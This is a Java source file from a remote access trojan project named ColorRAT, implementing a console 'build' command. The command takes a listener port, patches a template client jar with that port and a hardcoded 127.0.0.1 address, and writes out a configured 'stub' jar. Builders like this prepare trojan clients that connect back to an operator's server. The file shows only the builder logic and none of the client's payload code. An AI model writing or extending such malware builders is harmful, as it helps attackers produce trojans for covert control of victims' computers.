package eu.aragonapp.colorrat.command.types;

import eu.aragonapp.colorrat.ColorServer;
import eu.aragonapp.colorrat.command.Command;
import eu.aragonapp.colorrat.network.NetworkConnection;
import eu.aragonapp.colorrat.network.listener.Listener;
import eu.aragonapp.injection.Injector;

import java.io.File;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class BuildCommand implements Command {

    @Override
    public boolean execute(String[] args) {
        if(args.length == 1) {
            int port;

            try {
                port = Integer.valueOf(args[0]);
            } catch (NumberFormatException ex) {
                ColorServer.getLogger().error("The specified port \"" + args[0] + "\" is not valid.");
                return true;
            }

            final AtomicReference<Listener> listener = new AtomicReference<>();
            ColorServer.getInstance().getListeners().stream().filter(listener1 -> listener1.getPort() == port).findFirst().ifPresent(listener::set);

            if(listener.get() == null) {
                ColorServer.getLogger().error("The given listener-port \"" + args[0] + "\" doesn't exists!");
                return true;
            }

            final File inputFile = new File("assets/ColorRAT - Client.jar");
            final File outputFile = new File("stubs/stub-" + port + ".jar");

            if(!outputFile.getParentFile().exists())
                outputFile.getParentFile().mkdirs();

            if(!inputFile.exists()) {
                ColorServer.getLogger().error("The template stub doesn't exits. Please reinstall everything!");
                return true;
            }

            new Injector(inputFile.getAbsolutePath(), "eu.aragonapp.colorrat.ColorClient", injector -> {
                injector.insertBefore("setInformations", "this.port = " + port + ";");
                injector.insertBefore("setInformations", "this.address = \"127.0.0.1\";");
                return null;
            }).write(outputFile.getAbsolutePath());

            ColorServer.getLogger().info("Successfully built a stub with the port \"" + port + "\".");
            return true;
        }
        return false;
    }

    @Override
    public String description() {
        return "Builds a jar with the given port";
    }

    @Override
    public String usage() {
        return "build <port>";
    }

    @Override
    public String name() {
        return "build";
    }

}
